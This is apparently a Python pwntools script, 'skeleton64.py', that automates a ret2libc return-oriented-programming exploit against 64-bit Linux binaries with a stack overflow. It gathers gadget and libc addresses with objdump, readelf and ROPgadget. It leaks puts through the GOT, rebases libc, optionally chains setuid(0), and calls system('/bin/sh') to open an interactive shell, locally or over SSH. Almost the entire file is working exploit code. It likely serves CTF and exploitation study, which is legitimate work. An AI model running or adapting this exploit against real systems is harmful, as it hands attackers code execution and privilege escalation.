#!/usr/bin/env python

from pwn import *
import sys, os, subprocess


def print_help():
	print '''Usage: skeleton64.py binary JUNK_SIZE plt_main_addr pop_rdi plt_put_addr got_put_addr libc_system_addr libc_binsh_addr libc_puts [libc_setuid_addr]'''
	print '''   or: skeleton64.py binary JUNK_SIZE /path/to/libc.so.6 [-s] for automate search of the address\n'''
	print '''		-s\t:\tsetUID to 0\n'''
	print '''		JUNK_SIZE\t:\t Size of the Seg fault junk gained by gdb pattern create offset  \n\n'''
	print '''		to use gdb : echo 'gdb' > .skeleton '''
	print '''		to use ssh : echo 'ssh IP[user:password]' > .skeleton '''
	exit()


if (len(sys.argv) < 10 and len(sys.argv) != 4 and len(sys.argv) != 5) or ('-h' in sys.argv) or ('--help' in sys.argv):
	print_help()


banner = '''
///////////////////////////////////////////////

 ____  _  _______ _     _____ _____ ___  _   _
/ ___|| |/ / ____| |   | ____|_   _/ _ \| \ | |
\___ \| ' /|  _| | |   |  _|   | || | | |  \| |
 ___) | . \| |___| |___| |___  | || |_| | |\  |
|____/|_|\_\_____|_____|_____| |_| \___/|_| \_|


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

automatized pwnage of 64 bit binaries using pwn tools, objdump, readelf and ROPGadget

* readelf
* objdump
* pwntools
* ROPGadget


'''

context(terminal=('tmux', 'new-window'))



sk_process_file = ".skeleton"
if os.path.exists(sk_process_file):
	fo = open(sk_process_file, 'r')
	l = fo.readline()
	fo.close()
	if l[0:3] == "gdb":
		p = gdb.debug(sys.argv[1])
	elif l[0:3] == "ssh":
		host = l[4:l.index('[')]
		user = l[l.index('[')+1:l.index(':')]
		pwd =  l[l.index(':')+1:l.index(']')]
		print "Using ssh with host %s and user %s" %(host, user)
		s = ssh(host=host, user = user, password=pwd )
		p = s.process(sys.argv[1])
	else:
		p = process(sys.argv[1])
else:
	p = process(sys.argv[1])

context(os='linux', arch="amd64")

pop_rdi = 0x0
plt_puts = 0x0
plt_main = 0x0
got_puts = 0x0
libc_puts = 0x0
libc_system = 0x0
libc_sh = 0x0
libc_setuid = 0x0





def retrieve_addr():
	'''
	$ readelf -s libc.so.6 | grep " puts@@GLIBC_[0-9]"
   		 426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
	$ readelf -s libc.so.6 | grep " system@@GLIBC_[0-9]"
  		 1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
	$ readelf -s libc.so.6 | grep " setuid@@GLIBC_[0-9]"
    		 25: 00000000000c8910   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5
	$ strings -a -t x libc.so.6 | grep /bin/sh
		 183cee /bin/sh
	$ ropper --string "pop rdi; ret;" -f sys.argv[1] OR
	$ROPgadget --binary myapp --ropchain | grep "pop rdi ; ret"
		0x000000000040120b : pop rdi ; ret
	'''
	global pop_rdi
	global plt_main
	global libc_sh
	global plt_puts
	global got_puts
	global libc_system
	global libc_puts
	global libc_setuid

	# we could use pwn rop but whatever
	#TODO search for addressses using
	objdump = "objdump -D "+sys.argv[1]+" | grep \"%s\""
	puts_dump = objdump  % ("puts@GLIBC_[0-9]")
	main_dump = objdump  % ("<main>")
	_pop_rdi = "ROPgadget --binary %s | grep \"pop rdi ; ret\" " % (sys.argv[1])

	libc = "readelf -s "+sys.argv[3]+" | grep \"%s\""
	_libc_sys = libc % ("system@@GLIBC_[0-9]")
	_libc_setuid = libc % ("setuid@@GLIBC_[0-9]")
	_libc_puts = libc % ("puts")
	_libc_bash = "strings -a -t x %s | grep /bin/sh" % (sys.argv[3])
	#TODO execute and get
	libc_system = int("0x"+subprocess.check_output(_libc_sys, shell=True).strip().split(" ")[1], 16)
	libc_puts = int("0x"+subprocess.check_output(_libc_puts, shell=True).strip().split(" ")[1], 16)
	libc_setuid = int("0x"+subprocess.check_output(_libc_setuid, shell=True).strip().split(" ")[1], 16)
	
	print subprocess.check_output(_pop_rdi, shell=True)
	pop_rdi = p64(int(subprocess.check_output(_pop_rdi, shell=True).strip().split(" ")[0], 16))
	puts_out = subprocess.check_output(puts_dump, shell=True).strip().split(" ")
	plt_puts = p64(int("0x"+puts_out[0].split("\t")[0][0:-1], 16))
	got_puts = p64(int("0x"+puts_out[-2], 16))
	plt_main = p64(int("0x"+subprocess.check_output(main_dump, shell=True).strip().split(" ")[0], 16))
	libc_sh = subprocess.check_output(_libc_bash, shell=True).strip()
	libc_sh = int("0x"+libc_sh[0:libc_sh.index(" ")], 16)


def recv_and_send(i):
	#TODO 
	for x in range(0, i):
		p.recvline()





print banner;

JUNK_SIZE = int(sys.argv[2])
junk = "A"*int(JUNK_SIZE)



if len(sys.argv) < 10:
	retrieve_addr()
else:
	plt_main = p64(int(sys.argv[3], 16))
	pop_rdi = p64(int(sys.argv[4], 16))
	plt_puts = p64(int(sys.argv[5], 16))
	got_puts = p64(int(sys.argv[6], 16))
	libc_system = int(sys.argv[7], 16)
	libc_sh = int(sys.argv[8], 16)
	libc_puts = int(sys.argv[9], 16)
	if len(sys.argv) > 10:
		libc_setuid = int(sys.argv[10], 16)



print "Hexes: "
print "plt put : %s" %(plt_puts)
print "got put : %s" %(got_puts)
print "plt main : %s" %(plt_main)
print "pop rdi : %s" %(pop_rdi)
print "libc system : %s" %(hex(libc_system))
print "libc sh : %s" %(hex(libc_sh))
print "libc puts : %s" %(hex(libc_puts))
if len(sys.argv)>10 or (len(sys.argv)>4 and sys.argv[4] == '-s'):
	print "libc setuid : %s" %(hex(libc_setuid))
print ""

#round 1: get leaked puts
payload = junk + pop_rdi + got_puts + plt_puts + plt_main

###TODO user input for how many recvlines we have to do 
#i = int(raw_input("Please set the SEGFAULT input line e.g. it asks twice with no SEGFAULT, but the third contains the vuln set it to 3\nINPUT LINE:"))
j = int(raw_input("Please set the no of lines the program will print between the input and before exiting with the SEGFAULT.\nINPUT LINE:"))

#recv_and_send(i)
print "Please use Ctrl+C to gain shell"
p.stream(True)
p.sendline(payload)

for x in range(0, j):
	p.recvline()



#get leaked address
#use leaked address to second round
leaked_puts = p.recvline()[:8].strip().ljust(8, '\x00')


print("Leaked PUTS @ "+str(leaked_puts))

#calculating offset

offset = u64(leaked_puts) - libc_puts
system = p64(offset +libc_system)
sh =  p64(offset + libc_sh)
setuid = ''
if len(sys.argv)>10 or (len(sys.argv)>4 and sys.argv[4] == '-s'):
	print "Will use setuid"
	setuid = pop_rdi + p64(0x0) + p64(offset + libc_setuid)
	print setuid

payload = junk + setuid + pop_rdi + sh + system

print payload
#recv_and_send(i)

p.sendline(payload)

p.sendline("whoami")
p.sendline("id")
p.sendline("hostname")
p.interactive()
